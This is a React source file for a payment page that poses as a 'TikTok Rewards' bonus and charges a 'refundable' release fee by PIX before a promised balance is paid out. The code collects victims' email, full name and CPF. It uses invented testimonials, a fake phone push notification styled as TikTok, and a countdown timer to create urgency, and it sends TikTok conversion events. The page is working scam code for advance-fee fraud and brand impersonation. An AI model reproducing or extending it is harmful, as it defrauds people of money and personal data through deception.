import { useState, useEffect, useRef, useCallback, useMemo } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";
import { CheckCircle2, Star, Loader2, Copy, Check } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import { TARGET_BALANCE } from "@/lib/constants";
import { getUtms } from "@/lib/utm";
import tiktokLogo from "@/assets/tiktok-logo.png";
import tiktokRound from "@/assets/tiktok-round.png";
import pixLogo3 from "@/assets/pix-logo-icon-3.png";
import notifIos from "@/assets/notif-ios.png";
import testimonialMatheus from "@/assets/testimonial-matheus.png";
import testimonialAna from "@/assets/testimonial-ana.png";
import testimonialCarlos from "@/assets/testimonial-carlos.png";

const DEFAULT_TAX = 32.68;
const SALDO = TARGET_BALANCE;

const testimonials = [
{
  name: "Matheus Henrique Santos",
  text: '"rapazz e nao foi que esse ngc do bônus deu boa aqui tbm familia KKKKKK"',
  avatar: testimonialMatheus
},
{
  name: "Ana Paula Silva",
  text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"',
  avatar: testimonialAna
},
{
  name: "Carla Eduarda",
  text: '"no começo fiquei com pé atrás, mas caiu certinho na minha conta em menos de 5 min 🙏"',
  avatar: testimonialCarlos
}];


const PushNotification = ({
  show,
  exiting,
  isIOS,
  onDismiss





}: {show: boolean;exiting: boolean;isIOS: boolean;onDismiss: () => void;}) => {
  if (!show) return null;
  return (
    <div
      className="fixed z-[9999] cursor-pointer"
      onClick={onDismiss}
      style={{
        animation: exiting ?
        "notifSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards" :
        "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
        top: isIOS ? "env(safe-area-inset-top, 0px)" : "12px",
        left: isIOS ? "6px" : "12px",
        right: isIOS ? "6px" : "12px"
      }}>

      {isIOS ?
      <img
        src={notifIos}
        alt="Transferência pendente"
        className="w-full max-w-md mx-auto rounded-[22px]"
        style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
        loading="eager"
        decoding="async" /> :


      <div
        className="rounded-2xl p-4 mx-auto max-w-md"
        style={{
          fontFamily: "'Roboto', 'Google Sans', 'Noto Sans', sans-serif",
          background: "#2a2a2e",
          boxShadow: "0 6px 24px rgba(0,0,0,0.3)"
        }}>

          <div className="flex items-center gap-2 mb-2">
            <img src={tiktokRound} alt="TikTok" className="h-4 w-4 rounded-sm object-cover shrink-0" />
            <span className="text-[11px] text-white/50 font-medium">TikTok Bônus</span>
            <span className="text-[11px] text-white/35 mx-0.5">•</span>
            <span className="text-[11px] text-white/35">agora</span>
          </div>
          <div className="flex items-start gap-3">
            <div className="flex-1 min-w-0">
              <p className="text-[14px] font-semibold text-white leading-tight mb-0.5">Transferência pendente</p>
              <p className="text-[13px] text-white/70 leading-snug">
                Transferência no valor de R$&nbsp;{SALDO.toFixed(2).replace(".", ",")} aguardando pagamento da taxa de liberação.
              </p>
            </div>
            <img src={tiktokRound} alt="TikTok" className="h-10 w-10 rounded-xl object-cover shrink-0 mt-0.5" />
          </div>
        </div>
      }
    </div>);

};

const Pagamento = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();

  const TAX = useMemo(() => {
    const amt = parseFloat(searchParams.get("amount") || "");
    return isNaN(amt) ? DEFAULT_TAX : amt;
  }, [searchParams]);

  const nextRoute = searchParams.get("next") || "/up1";
  const paymentDesc = searchParams.get("desc") || "Taxa de Cadastro - TikTok Rewards";

  useEffect(() => {
    trackTikTokEvent({ event: "AddPaymentInfo", properties: { value: TAX, currency: "BRL" } });
  }, [TAX]);

  const [email, setEmail] = useState("");
  const [nomeCompleto, setNomeCompleto] = useState("");
  const [cpf, setCpf] = useState("");
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<{
    qr_code: string;
    qr_code_base64: string;
    transaction_id: number;
  } | null>(null);
  const [copied, setCopied] = useState(false);
  const [showNotification, setShowNotification] = useState(false);
  const [exitingNotification, setExitingNotification] = useState(false);
  const [dismissNotification, setDismissNotification] = useState(false);

  const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);

  const [timeLeft, setTimeLeft] = useState(5 * 60);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((t) => Math.max(0, t - 1)), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const minutes = String(Math.floor(timeLeft / 60)).padStart(2, "0");
  const seconds = String(timeLeft % 60).padStart(2, "0");

  // Poll payment status every 5s after PIX is generated
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const checkPaymentStatus = useCallback(async () => {
    if (!pixData?.transaction_id) return;
    try {
      const { data, error } = await supabase.functions.invoke("check-pix-status", {
        body: { transaction_id: pixData.transaction_id }
      });
      if (error) return;
      const status = data?.status?.toLowerCase?.() || "";
      if (status === "approved") {
        if (pollingRef.current) clearInterval(pollingRef.current);
        navigate(nextRoute);
      }
    } catch {
      // silent retry
    }
  }, [pixData?.transaction_id, navigate, nextRoute]);

  useEffect(() => {
    if (!pixData?.transaction_id) return;
    // Start polling
    pollingRef.current = setInterval(checkPaymentStatus, 5000);
    // Also check immediately
    checkPaymentStatus();
    return () => {
      if (pollingRef.current) clearInterval(pollingRef.current);
    };
  }, [pixData?.transaction_id, checkPaymentStatus]);

  const handlePagar = async () => {
    setLoading(true);
    try {
      const reference = `TK-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
      const tipoChave = localStorage.getItem("tiktok_tipo_chave") || "";
      const chavePix = localStorage.getItem("tiktok_chave_pix") || "";
      const utms = getUtms();

      const document = cpf.replace(/\D/g, "");
      const phone = tipoChave === "telefone" ? chavePix.replace(/\D/g, "") : "11999999999";

      const { data, error } = await supabase.functions.invoke("create-pix-payment", {
        body: {
          amount: Math.round(TAX * 100),
          description: paymentDesc,
          reference,
          source: "api_externa",
          customer: {
            name: nomeCompleto.trim(),
            email: email.trim(),
            document,
            phone
          },
          ...(Object.keys(utms).length > 0 && { tracking: utms })
        }
      });

      if (error) throw error;

      if (data?.status === "success" || data?.qr_code) {
        setPixData({
          qr_code: data.qr_code,
          qr_code_base64: data.qr_code_base64,
          transaction_id: data.transaction_id
        });
        setShowNotification(true);
        setTimeout(() => setExitingNotification(true), 5000);
        setTimeout(() => setDismissNotification(true), 5400);
        trackTikTokEvent({ event: "CompletePayment", properties: { value: TAX, currency: "BRL", transaction_id: data.transaction_id } });
      } else {
        throw new Error(data?.error || "Erro ao gerar pagamento");
      }
    } catch (err: unknown) {
      console.error("Payment error:", err);
      toast({
        title: "Erro no pagamento",
        description: err instanceof Error ? err.message : "Tente novamente em instantes.",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  const handleCopyPix = async () => {
    if (!pixData?.qr_code) return;
    await navigator.clipboard.writeText(pixData.qr_code);
    setCopied(true);
    toast({ title: "Código PIX copiado!" });
    setTimeout(() => setCopied(false), 3000);
  };

  const isFormValid = email.trim() && nomeCompleto.trim() && cpf.replace(/\D/g, "").length === 11;

  const handleDismissNotification = () => {
    setExitingNotification(true);
    setTimeout(() => setDismissNotification(true), 400);
  };

  const pad = (n: number) => String(n).padStart(2, "0");

  return (
    <div className="flex min-h-screen flex-col bg-white relative">
      <PushNotification
        show={showNotification && !dismissNotification}
        exiting={exitingNotification}
        isIOS={isIOS}
        onDismiss={handleDismissNotification} />


      {/* Expiration banner — same style as Pix page */}
      <div style={{ background: "#000", padding: "10px 0", textAlign: "center" }}>
        <p style={{ fontSize: 12, fontWeight: 600, color: "#fff", letterSpacing: "0.05em", margin: 0, display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
          PAGAMENTO EXPIRA EM
          {[pad(0), minutes, seconds].map((v, i) =>
          <span key={i} style={{ display: "inline-flex", alignItems: "center", gap: 4 }}>
              {i > 0 && <span style={{ color: "#fff" }}>-</span>}
              <span
              style={{
                background: timeLeft <= 60 ? "#FE2C55" : "#E6E6E6",
                color: timeLeft <= 60 ? "#fff" : "#000",
                fontWeight: 700,
                fontSize: 10,
                padding: "2px 6px",
                borderRadius: 3,
                fontVariantNumeric: "tabular-nums"
              }}>

                {v}
              </span>
            </span>
          )}
        </p>
      </div>

      {/* Logo */}
      <div className="flex justify-center py-6">
        <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
      </div>

      <div className="px-4 space-y-4 pb-10 max-w-[449px] mx-auto w-full">
        {/* Saldo Card — black, same as Checkout */}
        <div className="rounded-2xl bg-black p-5">
          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-1">Saldo disponível</p>
          <p className="text-3xl font-extrabold text-white" style={{ whiteSpace: "nowrap" }}>
            R$&nbsp;{SALDO.toFixed(2).replace(".", ",")}
          </p>
          <p className="text-xs text-gray-500 mt-1">Aguardando pagamento da taxa de liberação</p>
        </div>

        {/* Taxa Card */}
        <div className="rounded-2xl border border-gray-200 p-5">
          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-3">Taxa de verificação</p>
          <div className="flex items-center gap-2 mb-3">
            <span className="text-2xl font-normal" style={{ color: "#FE2C55" }}>
              R$&nbsp;{TAX.toFixed(2).replace(".", ",")}
            </span>
            <span className="rounded-full bg-green-100 text-green-600 text-[10px] font-bold px-2 py-0.5 uppercase">
              Reembolsável
            </span>
          </div>
          <div className="flex items-center gap-3">
            <img src={pixLogo3} alt="Pix" className="h-5 w-5" loading="eager" decoding="async" />
            <div className="flex items-center gap-1.5">
              
              <span className="text-[11px] text-gray-400">Pagamento seguro via PIX</span>
            </div>
          </div>
        </div>

        {/* Form Card */}
        <div className="rounded-2xl border border-gray-200 p-5">
          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-4">Seus dados</p>

          <div className="space-y-3">
            <div>
              <label className="text-sm font-semibold text-black block mb-2">Email</label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="seuemail@exemplo.com"
                className="w-full border-b border-gray-300 pb-2 text-black placeholder:text-gray-300 outline-none bg-transparent"
                style={{ fontSize: "16px" }} />

            </div>
            <div>
              <label className="text-sm font-semibold text-black block mb-2">Nome completo</label>
              <input
                type="text"
                value={nomeCompleto}
                onChange={(e) => setNomeCompleto(e.target.value)}
                placeholder="Nome e sobrenome"
                className="w-full border-b border-gray-300 pb-2 text-black placeholder:text-gray-300 outline-none bg-transparent"
                style={{ fontSize: "16px" }} />

            </div>
            <div>
              <label className="text-sm font-semibold text-black block mb-2">CPF</label>
              <input
                type="text"
                inputMode="numeric"
                value={cpf}
                onChange={(e) => {
                  const digits = e.target.value.replace(/\D/g, "").slice(0, 11);
                  const formatted = digits.
                  replace(/(\d{3})(\d)/, "$1.$2").
                  replace(/(\d{3})(\d)/, "$1.$2").
                  replace(/(\d{3})(\d{1,2})$/, "$1-$2");
                  setCpf(formatted);
                }}
                placeholder="000.000.000-00"
                className="w-full border-b border-gray-300 pb-2 text-black placeholder:text-gray-300 outline-none bg-transparent"
                style={{ fontSize: "16px" }} />

            </div>
          </div>
        </div>

        {/* CTA */}
        <button
          onClick={handlePagar}
          disabled={!isFormValid || loading || !!pixData}
          className="w-full h-14 rounded-2xl text-base font-bold text-white transition-all disabled:opacity-40"
          style={{
            background: !isFormValid || loading || !!pixData ? "#F1F1F3" : "#FE2C55",
            color: !isFormValid || loading || !!pixData ? "#D4D4D4" : "#fff"
          }}>

          {loading ?
          <span className="flex items-center justify-center gap-2">
              <Loader2 className="h-5 w-5 animate-spin" /> Gerando PIX...
            </span> :
          pixData ?
          <span className="flex items-center justify-center gap-2">
              <CheckCircle2 className="h-5 w-5" /> PIX Gerado
            </span> :

          "Liberar Saque"
          }
        </button>

        {/* QR Code result */}
        {pixData &&
        <div className="rounded-2xl border border-gray-200 p-5 text-center space-y-4">
            <div className="inline-flex items-center justify-center h-12 w-12 rounded-full mx-auto bg-green-50">
              <CheckCircle2 className="h-6 w-6 text-green-500" />
            </div>
            <div>
              <h2 className="text-base font-bold text-black">PIX gerado com sucesso!</h2>
              <p className="text-xs text-gray-400 mt-1">Escaneie o QR Code ou copie o código</p>
            </div>

            <div className="flex justify-center p-4 rounded-xl bg-gray-50">
              <QRCodeSVG value={pixData.qr_code} size={180} level="M" className="rounded-lg" />
            </div>

            <button
            onClick={handleCopyPix}
            className="w-full h-12 rounded-xl text-[13px] font-bold text-white transition-all flex items-center justify-center gap-2 bg-black">

              {copied ?
            <>
                  <Check className="h-4 w-4" style={{ color: "#25F4EE" }} /> Copiado!
                </> :

            <>
                  <Copy className="h-4 w-4" /> Copiar Código PIX
                </>
            }
            </button>

            <p className="text-[11px] text-gray-400">
              Confirmação automática em até 2 minutos após pagamento.
            </p>
          </div>
        }

        {/* Testimonials */}
        <div className="pt-2">
          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-3">O que estão dizendo</p>
          <div className="flex gap-3 overflow-x-auto pb-3 -mx-4 px-4 snap-x snap-mandatory" style={{ scrollbarWidth: "none", msOverflowStyle: "none", WebkitOverflowScrolling: "touch" }}>
            {testimonials.map((t) =>
            <div key={t.name} className="min-w-[260px] max-w-[260px] rounded-2xl border border-gray-200 p-4 snap-start shrink-0">
                <div className="flex items-center gap-2.5 mb-2">
                  <div className="h-8 w-8 rounded-full overflow-hidden shrink-0">
                    <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" loading="eager" decoding="async" />
                  </div>
                  <div>
                    <p className="text-[12px] font-bold text-black">{t.name}</p>
                    <div className="flex gap-0.5">
                      {Array.from({ length: 5 }).map((_, i) =>
                    <Star key={i} className="h-2.5 w-2.5 fill-yellow-400 text-yellow-400" />
                    )}
                    </div>
                  </div>
                </div>
                <p className="text-[11px] leading-relaxed text-gray-500">{t.text}</p>
              </div>
            )}
          </div>
        </div>

        <p className="text-xs text-gray-400 text-center leading-relaxed pb-4">
          Ao finalizar o pagamento você concorda com os termos de uso e privacidade do{" "}
          <a href="https://www.tiktok.com" target="_blank" rel="noopener noreferrer" className="underline text-gray-500 hover:text-gray-700">
            TikTok
          </a>
          .
        </p>
      </div>
    </div>);

};

export default Pagamento;